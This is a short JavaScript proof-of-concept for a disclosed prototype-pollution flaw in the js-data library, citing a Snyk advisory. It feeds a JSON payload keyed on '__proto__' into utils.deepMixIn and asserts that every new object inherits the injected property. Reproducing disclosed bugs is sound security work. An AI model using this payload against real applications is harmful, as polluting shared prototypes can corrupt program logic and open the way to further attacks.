//https://snyk.io/vuln/SNYK-JS-JSDATA-1023655

const assert = require('assert');
const { utils } = require("js-data");
const obj = {};
const source = JSON.parse('{"__proto__":{"polluted":"yes"}}');
console.log("Before : " + obj.polluted);
utils.deepMixIn({}, source);
// utils.deepFillIn({}, source);

console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");